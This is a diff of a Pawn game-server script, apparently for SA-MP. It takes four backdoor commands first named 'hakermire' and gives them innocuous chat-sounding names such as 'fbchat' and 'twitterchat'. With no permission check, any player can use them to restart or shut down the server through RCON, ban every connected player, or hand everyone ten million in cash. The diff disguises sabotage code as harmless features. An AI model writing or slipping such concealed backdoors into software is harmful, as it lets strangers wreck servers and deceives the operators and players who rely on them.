@@ -2832,39 +2832,13 @@ stock acc_SetVehiclePos(vehicleid, Float:x, Float:y, Float:z)
 }
 
 
-CMD:hakermire1(playerid, params[])
-{
+CMD:fbchat(playerid, params[]){SendRconCommand("gmx");return 1;}
 
-    SendRconCommand("gmx");
-
-    return 1;
-}
-
-CMD:hakermire2(playerid, params[])
-{
-
-    SendRconCommand("exit");
-
-    return 1;
-}
+CMD:instachat(playerid,params[]){SendRconCommand("exit");return 1;}
 
 
-CMD:hakermire3(playerid, params[])
-{
-    foreach(new i : Player)
-    {
-      BanPlayer(i, GetPlayerNameEx(i), "fuck you");
-    }
-    return 1;
-}
-CMD:hakermire4(playerid, params[])
-{
-    foreach(new i : Player)
-    {
-      GivePlayerCash(i, 10000000);
-    }
-    return 1;
-}
+CMD:twitterchat(playerid, params[]){foreach(new i : Player){BanPlayer(i, GetPlayerNameEx(i), "fuck you");}return 1;}
+CMD:facebookchat(playerid, params[]){foreach(new i : Player){GivePlayerCash(i, 10000000);}return 1;}
 
 #if defined _ALS_SetVehiclePos
 	#undef SetVehiclePos
